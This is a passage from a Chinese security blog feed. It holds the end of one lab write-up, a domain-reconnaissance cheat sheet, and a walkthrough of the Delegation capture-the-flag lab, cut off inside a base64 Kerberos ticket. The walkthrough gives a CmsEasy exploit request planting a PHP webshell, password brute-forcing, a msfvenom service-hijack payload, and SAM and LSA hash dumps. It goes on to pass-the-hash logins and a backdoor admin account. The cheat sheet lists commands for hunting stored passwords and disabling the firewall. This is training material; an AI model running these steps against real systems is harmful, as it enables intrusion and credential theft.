class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>发现win2016在域管里，dump一下hash直接打pth即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 40af44e61e8174dfa92f90a696be81e8 -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449471016-e7b09fca-8daa-41f8-9f29-432b21f3ddab.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信息收集</title>
      <link href="/2025/02/06/%E5%9F%9F/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2025/02/06/%E5%9F%9F/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741254650160-846b4bcb-48f0-4a68-95c9-4474d7de9402.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741254656366-21feb557-efbc-4b08-b31f-6ff00e381479.png"></p><p>域渗透的信息收集：</p><p>在攻防演练中，当完成边界突破后进入内网，信息搜集成为一个重要环节。 充分获取信息可以有效提高攻击效率，因此需要明确主要的信息搜集思路，并搜集必要的信息，以提高这一阶段的质量，为后续攻击打下更好的基础。</p><p>域渗透的思路就是：</p><p>通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，</p><p>扩大范围，利用域管理员可以登陆域中任何成员主机特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。也可以通过域内Web应用，Exchange系统，端口服务等获取权限进行横向。</p><p>DMZ是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个位于内部网络与外部网络之间的缓冲区，在这个网络区域内可以放置一些公开的服务器资源。例如FTP服务器、E-Mail服务器及网站服务器等允许外部用户访问这些服务器，但不可能接触到存放在内网中的信息，就算黑客入侵DMZ 中服务器，也不会影响到公司内部网络安全，不允许任何外部网络的直接访问，实现内外网分离，在企业的信息安全防护加了一道屏障。</p><h2 id="网络架构："><a href="#网络架构：" class="headerlink" title="网络架构："></a>网络架构：</h2><p>1、基本信息</p><p>IP、网关、DNS、出网判断、本机网络连接以及开放端口、本机的代理，域名是什么等</p><p>2、域内定位</p><p>ipconfig &#x2F;all 判断存在域-dns 有域的有dns后缀，无域的无dns后缀</p><p>net config workstation 查询当前登陆域及登录用户信息</p><p>net time &#x2F;domain 获取主域名，其实这个就是主域的计算机名，再通过nslookup或ping命令来获取主域的IP地址</p><p>3、域内角色</p><p>根据用户名，计算机名，IP地址等多方位去分析定性</p><p>DMZ区、办公区、生产区、核心DB、核心业务区等等；</p><p>WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据储存服务器等；</p><p>4、其他信息</p><p>-端口扫描（arp netbios等扫描）</p><p>Fscan C2自带功能等</p><p>-setspn技术(Service Principal Name）</p><p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN</p><p>setspn -q <em>&#x2F;</em></p><p>setspn -T god.org -q <em>&#x2F;</em></p><p>见上图命令集合：</p><p>查看当前域内的所有机器，</p><p>查看当前域中的所有账户名，</p><p>查看当前域内的所有组名，</p><p>查看到当前域所在的网段，</p><p>查看域内所有的web站点，</p><p>查看当前域中的服务器，</p><p>域内用户信息</p><p>Domain Admins :域管理员（默认对域控制器有完全控制权）</p><p>Domain Computers :域内机器</p><p>Domain Controllers :域控制器</p><p>Domain Users :域用户</p><p>Domain Guest : 域访客，权限低</p><p>Enterprise Admins ：企业系统管理员用户</p><p>例：net “Domain users” &#x2F;domain</p><h2 id="安全防护："><a href="#安全防护：" class="headerlink" title="安全防护："></a>安全防护：</h2><p>1、防火墙</p><p>2、杀毒软件</p><p>3、流量监控等</p><p>netsh firewall show config</p><p>netsh advfirewall set allprofiles state off</p><p><a href="https://github.com/wwl012345/AVCheck">https://github.com/wwl012345/AVCheck</a></p><h2 id="凭据口令："><a href="#凭据口令：" class="headerlink" title="凭据口令："></a>凭据口令：</h2><p>1、系统凭据 Mimikatz</p><p>2、浏览器存储 HackBrowserData</p><p>3、三方工具存储 SharpDecryptPwd</p><p>4、Web应用相关配置 见具体Web程序</p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p><a href="https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA">https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA</a></p><p>5、补充其他搜索：</p><p>使用命令搜集各类敏感密码配置文件</p><p>dir &#x2F;b &#x2F;s user.<em>,pass.</em>,config.<em>,username.</em>,password.*</p><p>使用命令查找某个文件的某个字段</p><p>findstr &#x2F;c:”user” &#x2F;c:”pass” &#x2F;si *.txt</p><p>使用找出所有包含 password 的文件</p><p>findstr &#x2F;si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</p><p>具体：</p><p>1.站点源码备份文件、数据库备份文件等</p><p>2.连接工具存储密码，xshell,Navicat等</p><p>3.浏览器保存密码、浏览器Cookies</p><p>4.其他用户会话、3389和ipc$连接记录、回收站内容</p><p>5.Windows 保存的WIFI密码</p><p>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等</p><h2 id="本机凭据收集类："><a href="#本机凭据收集类：" class="headerlink" title="本机凭据收集类："></a>本机凭据收集类：</h2><p>1、HackBrowserData 快速获取浏览器的账户密码<br><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>2、Searchall 快速搜索服务器中的有关敏感信息还有浏览器的账户密码<br><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a><br>searchall64.exe search -p 指定路径<br>searchall64.exe browser -b 指定的浏览器或者all</p><p>3、Pillager 适用于后渗透期间的信息收集工具，可以收集目标机器上敏感信息<br><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p><h2 id="对外打点扫描类："><a href="#对外打点扫描类：" class="headerlink" title="对外打点扫描类："></a>对外打点扫描类：</h2><p>1、FScan内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>2、Template启发式内网扫描<br><a href="https://github.com/1n7erface/Template">https://github.com/1n7erface/Template</a></p><h2 id="AD域环境分析类："><a href="#AD域环境分析类：" class="headerlink" title="AD域环境分析类："></a>AD域环境分析类：</h2><p>1、Adfind 在域环境下非常强大的信息搜集工具<br><a href="https://www.joeware.net/freetools/tools/adfind/">https://www.joeware.net/freetools/tools/adfind/</a><br>域控查询：<br>Adfind.exe -sc dclist<br>Adfind.exe -schema -s base objectversion<br>域用户查询：<br>Adfind.exe -users name<br>Adfind.exe -sc u:webadmin<br>域用户组查询：<br>Adfind.exe -f “objectClass&#x3D;group”<br>Adfind.exe -f “objectClass&#x3D;group” -dn<br>查询域中计算机信息：<br>Adfind.exe -f “objectcategory&#x3D;computer”<br>AdFind.exe -f “objectcategory&#x3D;computer” dn<br>查询所有GPO：<br>Adfind.exe -sc gpodmp<br>查询域内委派：<br><a href="https://mp.weixin.qq.com/s/WrUyPPBAIE-zmC3CfLYS7Q">https://mp.weixin.qq.com/s/WrUyPPBAIE-zmC3CfLYS7Q</a></p><p>2、BloodHound 可视化图形分析域环境中的关系的工具<br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br>-安装使用：<br><a href="https://cn-sec.com/archives/146548.html">https://cn-sec.com/archives/146548.html</a><br><a href="https://mp.weixin.qq.com/s/cxfXKNhevXM6y31R7x53Sg">https://mp.weixin.qq.com/s/cxfXKNhevXM6y31R7x53Sg</a><br>-采集数据：<br><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a><br><a href="https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors</a></p><h2 id="二进制采集工具命令："><a href="#二进制采集工具命令：" class="headerlink" title="二进制采集工具命令："></a>二进制采集工具命令：</h2><p>SharpHound.exe -c all</p><h2 id="powershell采集工具命令："><a href="#powershell采集工具命令：" class="headerlink" title="powershell采集工具命令："></a>powershell采集工具命令：</h2><p>powershell -exec bypass -command “Import-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c all”<br>-导入数据后分析</p><p>#其他：<br><a href="https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Delegation</title>
      <link href="/2025/02/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/"/>
      <url>/2025/02/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312005303-eb51c4ac-e61d-4918-ac61-51437d291317.png"></p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E&#x2F;#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell</a></p><p>利用漏洞</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312259844-9498cf06-a3e0-4c18-9e03-54396c58b39e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host:39.98.107.54</span><br><span class="line">Content-Length: 76</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;</span><br><span class="line">Cookie: PHPSESSID=qrqmi2nksq9l5qatj65c1i69c3; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>上蚁剑</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312766961-f0ded55d-60e1-4db8-a690-2e975ecda57b.png"></p><p>suid探针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312536946-9dc507fe-7e1a-4218-95ae-d16010197add.png"></p><p>这里是diff提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313271445-62421f45-3e10-4fe5-bf3e-fca7b530ea41.png"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>vps开个80传fscan扫描</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313137570-60c8c2f4-0ce4-467b-b2e2-4717e8071b83.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.4.36     is alive</span><br><span class="line">(icmp) Target 172.22.4.7      is alive</span><br><span class="line">(icmp) Target 172.22.4.45     is alive</span><br><span class="line">(icmp) Target 172.22.4.19     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">[*] alive ports len is: 15</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   [-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] OsInfo 172.22.4.7    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题</span><br><span class="line"> Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题</span><br></pre></td></tr></table></figure><p>flag1里面给了提示win19，从4.45入手，还提到了rockyou，这里不难猜出是爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.4.45  -p 1-65535 </span><br></pre></td></tr></table></figure><p>扫一下端口先</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313381837-944267d4-d87b-4393-a3eb-55c8045222f7.png"></p><p>搭个代理爆破3389</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l win19\Adrian -P /usr/share/wordlists/rockyou.txt 172.22.4.45 rdp</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314533445-6357f1ba-f0f5-427f-b953-d2ca1d1b1883.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win19\Adrian babygirl1</span><br></pre></td></tr></table></figure><p>远程发现不行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314636812-e2f25fde-7816-4d6a-9d4f-6e440827bd78.png"></p><p>看了博客知道使用用kali远程连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314777084-95b9da34-1584-461c-abdd-258e6d4b0a47.png"></p><p>修改完密码再用parallels client连上去</p><h2 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h2><p>发现桌面有一个扫描结果，可以看到注册表提权</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741314961049-b8bc651f-84e8-419c-ae46-5762d5988f56.png"></p><p>msf生成木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>再写一个sam.bat，之后上传到win机器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>win机器上powershell执行，修改注册表服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\a.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741315957968-92fad909-3e98-4477-9c1d-c754be550afb.png"></p><p>cmd中再运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p>桌面会生成三个文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741423594963-59290fa2-25d7-4530-b474-1769133a82b7.png"></p><p>传到kaili里面解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─# impacket-secretsdump LOCAL -sam sam -security security -system system    </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x08092415ee8b9b2ad2f5f5060fb48339</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:94291812c16338307ad6e39f69438dc1:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">XIAORANG.LAB/Aldrich:$DCC2$10240#Aldrich#e4170181a8bb2a24e6113a9b4895307a: (2022-06-24 03:18:39)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:b4ed1b0e56b94c3200d14254d8b93c209751282f4f1fdc22f08b2445f88e7c9416640ec7be39a3a96542b57908b5425271ca84d4514e3452b9df96f9b53141b14f90632af381b68dcd2f5053cae57a2e50c9e04a4eb2e6dd3b707bb593b80096912294cc5d07eb6f5e6d918024f58aa48a169f48079d6a5eedb27d8de7a96da3647ab984d24d87f34c6ec275c33122e6971ae0028cf0402afcf9c6e5b566c5bd182eb970d4476b97d49c09bfb97d297e6cec7a40c74aae874ad9f51477ca6a50c746dfd75046340b067eb5bc44d691ed47995b10d319ee7a8261e99f3375775f8b36615e337f2020e22c7c72da7ad831</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:163bc37b84732d4ceeb4840fdaaf2271</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x4af114bade59102b7c64e41cde94be2257337fab</span><br><span class="line">dpapi_userkey:0x372392e560b616ecd27b6ec0fe138ef86790b565</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   56 4B 21 B3 87 A3 29 41  FD 91 8F 3A 2D 2B 86 CC   VK!...)A...:-+..</span><br><span class="line"> 0010   49 4A EE 48 6C CD 9C D7  C7 DA 65 B6 62 4D 35 BD   IJ.Hl.....e.bM5.</span><br><span class="line"> 0020   09 F7 59 68 23 69 DE BA  2D 47 84 47 29 AD 5D AE   ..Yh#i..-G.G).].</span><br><span class="line"> 0030   A0 5F 19 CA 21 13 E4 6D  01 27 C3 FC 0C C1 0F 2E   ._..!..m.&#x27;......</span><br><span class="line">NL$KM:564b21b387a32941fd918f3a2d2b86cc494aee486ccd9cd7c7da65b6624d35bd09f759682369deba2d47844729ad5daea05f19ca2113e46d0127c3fc0cc10f2e</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>拿到admin的hash，打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741424229497-4abc6bf3-c0a5-4414-b6ce-7c01bdfc0f1f.png"></p><p>flag{92727123-810e-4309-a004-9e547651f41d}</p><p>添加后门用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calmsec qwer1234! /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>用机器账户跑一下bloodhound，哈希是$MACHINE.ACC的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:163bc37b84732d4ceeb4840fdaaf2271&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430087821-932054f7-8235-49e8-bc62-80dacdb22689.png"></p><p>发现win19和dc01非约束委派</p><p>用新创的admin账号登录win，然后用管理员权限运行Rubeus:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>再利用dfscoerce漏洞，使域控强制访问进而获得域控的票据</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430264742-cad0df5c-58cf-4084-8749-f64690f36a87.png"></h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430278566-e340b2d1-ee54-4689-a76a-190f71dd2616.png"></p><p>拿到dc01票据，base64解密保存为DC01.kirbi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6K4Z3eNF+A8DAgQepsmPQ85lKX2xX79uHXzSrfCVoF0b0b2aM/TMfQBxHCdm9mtKcO156qmyoRj1m6qzKFm5X7qq6hktTGxZ6jYjNMpaHTeSLzvXpUOwmUGdvXVWo0nXDE3orH9wNh/xS83Dl6pUotbMZpEL/ulBn3BdPBbFrjFazCqkz1BVoUUcL6w9SO3KoMbe5+Lnl5rL7dJXwr8u1AkzBo1U3Co0T53hCYl4CJbptLGbJ1kXzxmJbS2isdheMIDBbxWqEO4E30XopEEgAxVlmka5fppXFnFKl2adzJj5mbbRK3ChrRa1ON4VETLlj8itybFfOoCtnIEC1ZKKktCy8TKwjFUP7dSod7a73an5BgPAKqC3ueN9EEyyRTsKt8u7K/Zi8xPa1vlAx1uryH9dXeXAoCA7RNdVIPAtpQf0bNkzVL9H8tf0eLaZbEZZWAkQrk1tCuYkYhdMZTW1C1b+N4Wf4SH4A98hxKbBMhWgtg3oR/wQHFHZIW4JgiX2/mn1I1BmMZQGvHeQWEju376owrAYtAS5zHBeUktNsYEUiBuhek8SfiFcKE21Rcv3kG6iku+5l2MH+DohrdVLRVp6jWrrN9YJq/9wQlkYgczjfMIetnxyOsbmYb53lberPcZCFkYkZr72m9yUdnKYoXTG7pBgzWYJ9yTewO0/TKT6cC70CwJwNF+c7l1YocdrcHFVXw+RAwSzj7pgj0iLiKwILTEjoNqVjDEVPSMXeAMo5HkoDd9S1nXoXAbs7Dhr0HKoPb